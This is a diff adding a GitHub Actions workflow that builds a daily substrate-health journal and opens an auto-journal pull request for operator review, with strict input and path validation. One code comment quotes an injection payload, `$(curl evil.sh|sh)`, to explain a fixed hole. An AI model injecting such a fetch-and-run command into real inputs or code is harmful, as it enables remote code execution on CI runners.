@@ -1,0 +1,214 @@
+name: Substrate Health Journal
+
+# cycle-109 Sprint 5 T5.7 — daily substrate-health journal cron.
+#
+# Runs `python -m loa_cheval.journal --window 24h` once per day at 00:05 UTC
+# (offset by 5 min so it doesn't compete with rollover cron jobs at HH:00).
+# Appends a day-section to grimoires/loa/substrate-health/YYYY-MM.md if not
+# already present, then opens a PR labeled `auto-journal` on the
+# `substrate-health/journal` branch for operator review.
+#
+# Per C109.OP-5 Q2: cron uses `auto-journal` PR branch + operator-merge
+# (review queue). Direct commits to main are forbidden — every journal
+# update is operator-reviewed.
+#
+# Idempotency: if today's H2 already exists in the journal, the formatter
+# is a no-op and the workflow exits clean without opening a PR.
+
+on:
+  schedule:
+    # Daily 00:05 UTC — see file header for rationale
+    - cron: '5 0 * * *'
+  workflow_dispatch:
+    # Operator-on-demand trigger (e.g., catch-up after CI outage)
+    inputs:
+      window:
+        description: Aggregation window (24h / 7d / 30d)
+        required: false
+        default: '24h'
+      run_time:
+        description: Override run-time (ISO 8601 UTC; for replay)
+        required: false
+        default: ''
+
+permissions:
+  contents: write
+  pull-requests: write
+
+jobs:
+  journal:
+    name: Append substrate-health day-section
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+
+    steps:
+      - name: Checkout
+        # actions/checkout@v4
+        uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+        with:
+          fetch-depth: 0
+          # Need an authenticated token for the PR-open step
+          token: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Setup Python
+        # actions/setup-python@v5
+        uses: actions/setup-python@0b93645e9fea7318ecaed2b359559ac225c90a2b
+        with:
+          python-version: '3.11'
+
+      - name: Verify MODELINV log presence (PR #896 BB iter-4 + iter-5 closure)
+        id: log_check
+        env:
+          EVENT_NAME: ${{ github.event_name }}
+        run: |
+          # The scheduled cron runs on a fresh runner that has no
+          # .run/model-invoke.jsonl. Without explicit retrieval the
+          # aggregator sees zero invocations and the journal entry would
+          # be empty-but-successful (forever).
+          #
+          # iter-5 F002 closure: distinguish `schedule` event (cron) from
+          # `workflow_dispatch` (operator):
+          #   - schedule  + no log → FAIL-LOUD (non-zero exit). Otherwise
+          #     the daily cron prints green forever while writing nothing.
+          #   - workflow_dispatch + no log → clean exit 0 (operator
+          #     explicitly invoked; emit the diagnostic and return).
+          #
+          # cycle-110 follow-up: wire an artifact-download / S3 sync
+          # step that restores the production MODELINV log from a
+          # persistent source before this step.
+          if [[ ! -s .run/model-invoke.jsonl ]]; then
+              echo "[journal-precheck] .run/model-invoke.jsonl missing or empty on runner" >&2
+              echo "[journal-precheck] cycle-110: wire log-retrieval (artifact/S3) before re-enabling this workflow as scheduled" >&2
+              echo "log_present=false" >> "$GITHUB_OUTPUT"
+              if [[ "${EVENT_NAME}" == "schedule" ]]; then
+                  echo "[journal-precheck] FAIL: scheduled trigger requires log retrieval (cycle-110 prerequisite)" >&2
+                  exit 1
+              fi
+              # workflow_dispatch operator runs explicitly — exit clean
+              exit 0
+          fi
+          line_count=$(wc -l < .run/model-invoke.jsonl)
+          echo "[journal-precheck] log lines: $line_count"
+          echo "log_present=true" >> "$GITHUB_OUTPUT"
+
+      - name: Run journal formatter
+        id: journal
+        if: steps.log_check.outputs.log_present == 'true'
+        # PR #896 BB iter-2 FIND-001 closure: workflow_dispatch inputs are
+        # passed through `env:` (which the shell reads via "$VAR" — quoted,
+        # not interpolated) instead of `${{ github.event.inputs.* }}`
+        # interpolation directly into the `run:` block. The original shape
+        # let a dispatcher value like `$(curl evil.sh|sh)` execute under
+        # the job's `contents:write + pull-requests:write` scope.
+        # Also validate the inputs against strict regexes before use.
+        env:
+          PYTHONPATH: ${{ github.workspace }}/.claude/adapters
+          INPUT_WINDOW: ${{ github.event.inputs.window }}
+          INPUT_RUN_TIME: ${{ github.event.inputs.run_time }}
+        run: |
+          set -euo pipefail
+          mkdir -p grimoires/loa/substrate-health
+
+          # Strict input validation against the documented format
+          # (window: 24h/7d/30d/Nm  ; run_time: ISO 8601 UTC).
+          window="${INPUT_WINDOW:-24h}"
+          if [[ -z "$window" ]]; then window="24h"; fi
+          if ! [[ "$window" =~ ^[0-9]+[hdm]$ ]]; then
+              echo "[journal] INVALID window input — refusing: $(printf %q "$window")" >&2
+              exit 2
+          fi
+
+          rtime_arg=()
+          if [[ -n "${INPUT_RUN_TIME:-}" ]]; then
+              if ! [[ "$INPUT_RUN_TIME" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}(\.[0-9]+)?(Z|[+-][0-9]{2}:[0-9]{2})$ ]]; then
+                  echo "[journal] INVALID run_time input — refusing: $(printf %q "$INPUT_RUN_TIME")" >&2
+                  exit 2
+              fi
+              rtime_arg=(--run-time "$INPUT_RUN_TIME")
+          fi
+
+          # The formatter is idempotent — re-running on the same UTC day
+          # is a no-op. Output 'action' to step state.
+          result_json="$(
+            python3 -m loa_cheval.journal \
+              --journal-dir grimoires/loa/substrate-health \
+              --log-path .run/model-invoke.jsonl \
+              --window "$window" \
+              "${rtime_arg[@]}" \
+              --json
+          )"
+          echo "result=$result_json" >> "$GITHUB_OUTPUT"
+          action="$(echo "$result_json" | jq -r '.action')"
+          path="$(echo "$result_json" | jq -r '.path')"
+          echo "action=$action" >> "$GITHUB_OUTPUT"
+          echo "path=$path" >> "$GITHUB_OUTPUT"
+          echo "[journal] action=$action path=$path"
+
+      - name: Skip PR when no change
+        if: steps.log_check.outputs.log_present == 'true' && steps.journal.outputs.action == 'skipped'
+        run: |
+          echo "Journal already has today's section — no PR needed."
+
+      - name: Open auto-journal PR
+        if: steps.log_check.outputs.log_present == 'true' && steps.journal.outputs.action != 'skipped'
+        # PR #896 BB iter-2 FIND-001 closure: pass step output through
+        # `env:` (so shell sees "$JOURNAL_PATH" — quoted, not interpolated).
+        # Validate the path before any shell use.
+        env:
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          JOURNAL_PATH: ${{ steps.journal.outputs.path }}
+        run: |
+          set -euo pipefail
+
+          # Branch naming: substrate-health/journal-YYYY-MM-DD for traceability
+          today_utc="$(date -u +%Y-%m-%d)"
+          branch="substrate-health/journal-${today_utc}"
+
+          git config user.name 'loa-substrate-health-journal[bot]'
+          git config user.email 'loa-substrate-health-journal+noreply@anthropic.com'
+
+          # Reset onto main, create the branch, commit the journal file
+          git fetch origin main
+          git checkout -B "$branch" origin/main
+
+          # Validate JOURNAL_PATH shape — repo-relative, no traversal,
+          # under the expected directory. The formatter only writes here;
+          # anything else is a sign of upstream tampering.
+          if [[ -z "${JOURNAL_PATH:-}" ]] || \
+             [[ "$JOURNAL_PATH" == *".."* ]] || \
+             ! [[ "$JOURNAL_PATH" =~ ^grimoires/loa/substrate-health/[0-9]{4}-[0-9]{2}\.md$ ]]; then
+              echo "[journal-pr] REFUSING — JOURNAL_PATH outside expected shape: $(printf %q "${JOURNAL_PATH:-}")" >&2
+              exit 2
+          fi
+          path="$JOURNAL_PATH"
+          # Re-run the formatter on the freshly-checked-out base so the diff is
+          # against main (idempotent — same input, same output).
+          PYTHONPATH=.claude/adapters python3 -m loa_cheval.journal \
+            --journal-dir grimoires/loa/substrate-health \
+            --log-path .run/model-invoke.jsonl \
+            --window 24h \
+            --json > /dev/null
+
+          if git diff --quiet -- "$path"; then
+              echo "No diff against main — journal already up-to-date there."
+              exit 0
+          fi
+
+          git add "$path"
+          commit_msg=$(printf 'chore(substrate-health): journal entry for %s\n\nAutomated by .github/workflows/substrate-health-journal.yml.\nPer C109.OP-5 Q2 — operator-merge review queue.\n' "$today_utc")
+          git commit -m "$commit_msg"
+
+          git push --force-with-lease origin "$branch"
+
+          # Open or update the PR
+          if gh pr view "$branch" --json number >/dev/null 2>&1; then
+              echo "PR for $branch already exists — pushed an update."
+          else
+              pr_body=$(printf 'Automated daily substrate-health journal entry per cycle-109 Sprint 5 T5.7 / FR-5.8.\n\nPer **C109.OP-5 Q2** the journal lands on `substrate-health/journal-%s` and requires operator merge.\n\nIdempotent re-runs of the formatter on the same UTC day are a no-op; this PR exists only because today H2 was not already in the journal.\n' "$today_utc")
+              gh pr create \
+                  --base main \
+                  --head "$branch" \
+                  --title "auto-journal: substrate-health $today_utc" \
+                  --body "$pr_body" \
+                  --label "auto-journal"
+          fi
